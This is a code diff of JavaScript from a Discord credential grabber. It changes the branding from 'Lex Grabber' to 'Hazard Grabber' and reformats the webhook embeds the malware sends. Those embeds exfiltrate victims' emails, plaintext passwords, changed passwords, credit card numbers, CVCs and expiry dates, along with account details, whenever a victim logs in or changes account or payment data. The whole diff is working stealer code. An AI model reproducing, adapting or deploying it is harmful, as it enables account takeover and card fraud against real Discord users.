@@ -148,8 +148,13 @@ function Login(email, password, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Account Info**",
-                            "value": `Email: ${email} - Password: ${password}`,
+                            "name": "**E-Mail**",
+                            "value": `✨Email: ${email}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "**Password**",
+                            "value": `✨Password: ${password}`,
                             "inline": true
                         },
                         {
@@ -190,8 +195,13 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Password Changed**",
+                            "name": "**E-Mail**",
                             "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "**Password Changed**",
+                            "value": `❌Old Password: ${oldpassword}\n✅New Password: ${newpassword}`,
                             "inline": true
                         },
                         {
@@ -238,12 +248,17 @@ function ChangeEmail(newemail, password, token) {
                     "fields": [
                         {
                             "name": "**Email Changed**",
-                            "value": `New Email: ${newemail}\nPassword: ${password}`,
+                            "value": `✅New Email: ${newemail}\nPassword: ${password}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "**Password**",
+                            "value": `✅Password: ${password}`,
                             "inline": true
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `💸Nitro Type: ${GetNitro(json.premium_type)}\n💸Badges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -285,12 +300,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
-                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                            "value": `💳Credit Card Number: ${number}\n💳CVC: ${cvc}\n💳Credit Card Expiration: ${expir_month}/${expir_year}`,
                             "inline": true
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `💸Nitro Type: ${GetNitro(json.premium_type)}\n💸Badges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -304,7 +319,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Lex Grabber By lex wake#4297・https://discord.gg/Bn7r4tpW7x"
+                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                     }
                 }
             ]
